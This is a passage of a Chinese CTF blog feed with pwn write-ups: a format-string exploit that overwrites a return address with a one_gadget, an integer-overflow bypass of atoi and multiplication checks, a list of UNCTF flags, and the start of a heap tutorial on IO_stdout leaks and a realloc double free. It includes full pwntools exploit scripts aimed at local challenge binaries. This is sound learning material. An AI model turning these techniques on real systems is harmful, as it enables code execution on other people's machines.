class="string">"MYVIMRC=/home/NoOne/.vimrc"</span>)</span><br><span class="line">0096| 0xffb173ec --&gt; 0xffb17404 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>第一次格式化字符串我选了两个地方，%22$x%15$x<br>也就是上面的64跟92处，为什么选这两个位置呢？因为第一个，存了libc地址，第二个存了栈地址，并且他还有二级指针指向栈，这是必须的，因为格式化字符串写在了bss段，要在栈里写东西的话，只能通过二级指针，第一步先将这个地址泄露出来，第二步，往这个地址里写东西，因为这个地址本身就是栈里的嘛，所以写进去后，地址就在栈里了，所以就可以跟常规格式化字符串一样利用了</p><p>还有一点，只有三次机会，并且限制了大小，我第一次泄露，第二次写入要写入的地址，第三次写入的时候长度明显不够，所以我需要增大次数，所以要找到变量i或者N的地址，N的地址我是找不到，所以我找了i，他是个有符号数，我把他高位改成0xff，就可以变成负数，经过测试，上述40处为i,80处为返回地址，<br><img src="_v_images/20191029132200484_1723791493.png" alt="返回地址"></p><p>返回地址可以用find找到，找栈里的libc_start_main存在的地方就是ret</p><p>i调试下就出来了，三次会变化的地方</p><h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"It's time to input something\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(size1, size2)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size1, <span class="number">21</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size2, <span class="number">57</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload =<span class="string">"123456781234567"</span></span><br><span class="line">    Input(payload)</span><br></pre></td></tr></table></figure><h4 id="地址泄露部分"><a href="#地址泄露部分" class="headerlink" title="地址泄露部分"></a>地址泄露部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 1</span></span><br><span class="line">payload = <span class="string">"%22$x%15$x"</span></span><br><span class="line">Input(payload)</span><br><span class="line">stack_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">ret = stack_addr - <span class="number">0xa0</span></span><br><span class="line">count = stack_addr - <span class="number">0xc8</span></span><br><span class="line">__libc_start_main_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">lg(<span class="string">"stack_addr"</span>, stack_addr)</span><br><span class="line">lg(<span class="string">"ret_addr"</span>, ret)</span><br><span class="line">lg(<span class="string">"libc_start_main"</span>, __libc_start_main_addr)</span><br><span class="line">lg(<span class="string">"count"</span>, count)</span><br><span class="line">libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">one_gadget = [<span class="number">0x1395ba</span>, <span class="number">0x1395bb</span>]</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">lg(<span class="string">"one_gadget"</span>, one_gadget)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><h4 id="修改变量i"><a href="#修改变量i" class="headerlink" title="修改变量i"></a>修改变量i</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(<span class="number">0xffff</span> &amp; count + <span class="number">2</span>, <span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p>至于偏移为什么是这个，需要你们自己去调试，二级指针那个点位就是那个地方，还有修改后四位够了，栈里的位置，注意，这里是修改的是i的地址+2部分，也就是4个字节的前两个字节部分，修改为0xffff</p><h4 id="修改ret地址"><a href="#修改ret地址" class="headerlink" title="修改ret地址"></a>修改ret地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(<span class="number">0xffff</span> &amp; ret, <span class="number">0xffff</span> &amp; one_gadget)</span><br><span class="line">write((<span class="number">0xffff</span>&amp;ret) + <span class="number">2</span>, (<span class="number">0xffff0000</span> &amp; one_gadget)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">sla(<span class="string">"2. Exit\n"</span>, <span class="string">"2"</span>)</span><br></pre></td></tr></table></figure><p>这里先写后两个字节，在写前两个字节，写成one_gadget</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./7631454338ff70b1a6b1262f5f36beac'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"It's time to input something\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(size1, size2)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size1, <span class="number">21</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size2, <span class="number">57</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload =<span class="string">"123456781234567"</span></span><br><span class="line">    Input(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#stage 1</span></span><br><span class="line">    payload = <span class="string">"%22$x%15$x"</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    stack_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">    ret = stack_addr - <span class="number">0xa0</span></span><br><span class="line">    count = stack_addr - <span class="number">0xc8</span></span><br><span class="line">    __libc_start_main_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">    lg(<span class="string">"stack_addr"</span>, stack_addr)</span><br><span class="line">    lg(<span class="string">"ret_addr"</span>, ret)</span><br><span class="line">    lg(<span class="string">"libc_start_main"</span>, __libc_start_main_addr)</span><br><span class="line">    lg(<span class="string">"count"</span>, count)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    one_gadget = [<span class="number">0x1395ba</span>, <span class="number">0x1395bb</span>]</span><br><span class="line">    one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">    lg(<span class="string">"one_gadget"</span>, one_gadget)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    write(<span class="number">0xffff</span> &amp; count + <span class="number">2</span>, <span class="number">0xffff</span>)</span><br><span class="line">    write(<span class="number">0xffff</span> &amp; ret, <span class="number">0xffff</span> &amp; one_gadget)</span><br><span class="line">    <span class="comment">#gdb.attach(io, "b printf \n c")</span></span><br><span class="line">    write((<span class="number">0xffff</span>&amp;ret) + <span class="number">2</span>, (<span class="number">0xffff0000</span> &amp; one_gadget)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>这道题看着贼简单，打比赛的时候也不会做，细心想了下，我是傻逼，这道题流程很简单</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init(*&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( bypass1() &amp;&amp; bypass2() )</span><br><span class="line">    system(<span class="string">"cat ./flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"failed!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过了两个判断就拿到flag了</p><h3 id="bypass第一个判断"><a href="#bypass第一个判断" class="headerlink" title="bypass第一个判断"></a>bypass第一个判断</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">bypass1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"x: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"y: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(&amp;s, <span class="string">'-'</span>) || <span class="built_in">strchr</span>(&amp;buf, <span class="string">'-'</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  v2 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x167</span> || v2 &gt; <span class="number">0x167</span> || v1 - v2 != <span class="number">0x168</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"level1 success!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着很简单，不能输入负数，然后两个数要求小于167，相减又要等于168，常规思路肯定是不行的，想想<br>-0x1 - (-0x169) = 0x168</p><p>这是我第一次做的时候想到的，然后实际上是误打误撞做出来的，做出来后我发觉那会不理解这道题，就重新理了下思路，发觉还是有可以学习的地方的</p><ol><li><p>程序限制了不能输入负数</p></li><li><p>限制了大小</p></li><li><p>还有注意一点v1跟v2是int 4字节的，atoi转超过int最大的数值的话，会发生截断，只保留后低四个字节的值<br>假设输入的是0x7FFFFFFFF 7个F他只会取到后面的0xFFFFFFFF<br>所以限制输入不能带-号，而实际上内存里存值是只分大小的，所以我存0xFFFFFFFF 按有符号处理的话就是-1</p></li><li><p>s串跟buf串是相邻的，填满了buf的话，会将s里的值也一起传递过来，一起转成数字，就变成一个比较大的数了</p></li></ol><p><strong>坑点: atoi函数遇到\n会停止，没有遇到就继续。。原来我用sendafter一直不行，坑了我好久</strong></p><p>最后我用0x167-(-1)绕过了这个判断<br>就是输入0x167跟0x7FFFFFFFF,绕过这个判断</p><h3 id="bypass第二个判断"><a href="#bypass第二个判断" class="headerlink" title="bypass第二个判断"></a>bypass第二个判断</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_<span class="function">BOOL8 <span class="title">bypass2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input x and y:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d %d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">1</span> &amp;&amp; v2 &gt; <span class="number">360</span> &amp;&amp; v1 * v2 == <span class="number">360</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的话，也是利用溢出绕过,说下怎么求溢出的吧，口算也可以的嘞，不过脚本能跑就不动脑了</p><p>我要达到的数值是<em>00000168，</em>为任意数值，反正后4个字节得是0x168,跑一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(i, <span class="number">0x100000168</span>/float(i))</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="number">1</span>, <span class="number">4294967656.0</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">2147483828.0</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">1431655885.3333333</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="number">1073741914.0</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="number">858993531.2</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="number">715827942.6666666</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="number">613566808.0</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="number">536870957.0</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="number">477218628.4444444</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="number">429496765.6</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="number">390451605.09090906</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="number">357913971.3333333</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="number">330382127.38461536</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="number">306783404.0</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="number">286331177.06666666</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="number">268435478.5</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="number">252645156.2352941</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="number">238609314.2222222</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="number">226050929.2631579</span>)</span><br></pre></td></tr></table></figure><p>我选的要是不带小数的，我看着8吉利就选了他了，<br>所以输入为8跟536870957</p><p>所以最后可以拿到flag了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Process <span class="string">'./5b7420a5bcdc1da85bccc62dcea4c7b8'</span> stopped with <span class="built_in">exit</span> code 0 (pid 16098)</span><br><span class="line">[DEBUG] Received 0x27 bytes:</span><br><span class="line">    <span class="string">'cat: ./flag: No such file or directory\n'</span></span><br><span class="line">cat: ./flag: No such file or directory</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'5b7420a5bcdc1da85bccc62dcea4c7b8'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"x: \n"</span>, str(<span class="number">0x167</span>))</span><br><span class="line">    sla(<span class="string">"y: \n"</span>, str(<span class="number">0x7ffffffff</span>))</span><br><span class="line">    <span class="comment">#sl(str(0x7ffffe98) + " " + str(0x7fffffff))</span></span><br><span class="line">    sl(str(<span class="number">0x8</span>) + <span class="string">" "</span> + str(<span class="number">536870957</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学了下非栈里的格式化字符串利用，还有整数溢出部分详细的了解调试了下，希望能学到更多新知识</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/3dac6f4c/">https://noone-hub.github.io/posts/3dac6f4c/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒部分题解</title>
    <url>/posts/afb883f/</url>
    <content><![CDATA[<p>9 b9a5a633c806f9d24e42681c3f0360ba<br>5 4f1feb7c9b95b6d855c2a6ef8364452d<br>锅 $flag = “UNCTF{f66aa32e732bdb88556acc634371f673};<br>最好的php UNCTF{5ee25610af306b625b4cadb4cb5fa24b}</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>10 flag is ——&gt;UNCTF585 ae8df50433 972bb6ebd7 6e3ebd9f4</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/afb883f/">https://noone-hub.github.io/posts/afb883f/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全， writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程10</title>
    <url>/posts/62c86bb4/</url>
    <content><![CDATA[<h1 id="pwn-heap-learn-10"><a href="#pwn-heap-learn-10" class="headerlink" title="pwn-heap-learn-10"></a>pwn-heap-learn-10</h1><p>本文首发于先知社区</p><p>这个系列完结了吧，入门系列做到这里我感觉已经入门了，后面的就是靠自己去多练习，多学新点了，我这系列最后一篇就发下近期遇到的一些骚操作和新思路吧</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ0OQ==" title="https://xz.aliyun.com/t/6449">pwn堆入门系列教程7<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3Mw==" title="https://xz.aliyun.com/t/6473">pwn堆入门系列教程8<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjU1Ng==" title="https://xz.aliyun.com/t/6556">pwn堆入门系列教程9<i class="fa fa-external-link"></i></span></p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="unctf-Box"><a href="#unctf-Box" class="headerlink" title="unctf Box"></a>unctf Box</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>数组index是可以输入负数的，就是不会利用,后面看了萝卜师傅的wp才知道可以直接改IO_stdout</p><p>我是傻逼！这都想不到</p><p>然后有个double free,新点记录下</p><ul><li>size == 0 ，这个时候等同于free</li><li>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc</li><li>malloc_usable_size(realloc_ptr) &gt;= size， 这个时候等同于edit</li><li>malloc_usable_size(realloc_ptr) &lt; szie， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</li></ul><p>所以利用这个点第一次可以用普通的</p><ol><li>free(ptr)</li><li>realloc(ptr,0)</li></ol><p>这就是double free</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>利用IO_stdout泄露libc地址</li><li>利用double free改realloc为one_gadget</li></ol><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">edit(<span class="number">-12</span>, payload)</span><br><span class="line">lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line"><span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line"> <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">lg(<span class="string">"addr"</span>, addr)</span><br></pre></td></tr></table></figure><p>这里就是IO_FILE攻击，不清楚的可以自己学下，这里我学到个新操作。。我调试的时候要生要死的，没想到抛出异常，多亏大佬博客了，还有自己复现的时候用ida把前面一段打开文件那部分patch掉吧，不然感觉效率太慢了。。。</p><h4 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h4><p>这里还有个uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span 